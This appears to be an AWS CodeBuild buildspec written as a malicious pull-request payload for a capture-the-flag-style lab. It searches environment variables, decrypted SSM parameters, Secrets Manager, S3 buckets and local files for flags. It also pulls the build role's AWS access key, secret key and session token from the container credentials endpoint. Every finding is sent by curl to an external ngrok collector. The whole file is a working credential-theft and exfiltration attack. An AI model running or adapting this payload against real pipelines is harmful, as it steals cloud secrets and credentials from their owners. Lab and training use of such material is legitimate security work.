version: 0.2

# Malicious PR payload for codebuild_lab_5_project (lab5).
# Webhook builds arbitrary PRs from the PR-head buildspec -> runs as the project IAM role.
# Exfil target = user's ngrok collector via GET requests only.

phases:
  build:
    commands:
      - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"

      # 0) Check env vars for injected flag
      - |
        if env | grep -iE 'flag|FLAG' | head -1 > /tmp/flag_env.txt 2>&1; then
          FLAG=$(cat /tmp/flag_env.txt | cut -d= -f2)
          curl -s "${COLLECTOR}/?source=env&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
        fi

      # 1) Hunt flag in SSM parameters (decrypted)
      - |
        for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
          val=$(aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null || true)
          if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
            FLAG=$(echo -n "$val" | head -c 200)
            curl -s "${COLLECTOR}/?source=ssm&param=$(echo -n "$p" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
          fi
        done

      # 2) Hunt flag in Secrets Manager
      - |
        for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
          val=$(aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null || true)
          if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
            FLAG=$(echo -n "$val" | head -c 200)
            curl -s "${COLLECTOR}/?source=secrets&secret=$(echo -n "$s" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
          fi
        done

      # 3) Hunt flag in S3 buckets
      - |
        for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
          for obj in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[].Key' --output text 2>/dev/null | grep -iE 'flag|secret|ctf'); do
            val=$(aws s3api get-object --bucket "$b" --key "$obj" /dev/stdout 2>/dev/null | head -c 500 || true)
            if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
              FLAG=$(echo -n "$val" | head -c 200)
              curl -s "${COLLECTOR}/?source=s3&bucket=$(echo -n "$b" | jq -sRr @uri)&key=$(echo -n "$obj" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
            fi
          done
        done

      # 4) Hunt local flag files
      - |
        for f in $(find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null | head -20); do
          if [ -f "$f" ] && [ -r "$f" ]; then
            val=$(cat "$f" 2>/dev/null | head -c 500)
            if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
              FLAG=$(echo -n "$val" | head -c 200)
              curl -s "${COLLECTOR}/?source=file&path=$(echo -n "$f" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
            fi
          fi
        done

      # 5) If nothing found yet, send creds for manual hunting
      - |
        CREDS=$(curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>/dev/null || true)
        if [ ! -z "$CREDS" ]; then
          ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId' 2>/dev/null)
          SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey' 2>/dev/null)
          TOKEN=$(echo "$CREDS" | jq -r '.Token' 2>/dev/null | head -c 100)
          curl -s "${COLLECTOR}/?source=creds&accesskey=$(echo -n "$ACCESS_KEY" | jq -sRr @uri)&secretkey=$(echo -n "$SECRET_KEY" | jq -sRr @uri)&token=$(echo -n "$TOKEN" | jq -sRr @uri)"
        fi

      - echo "Done"
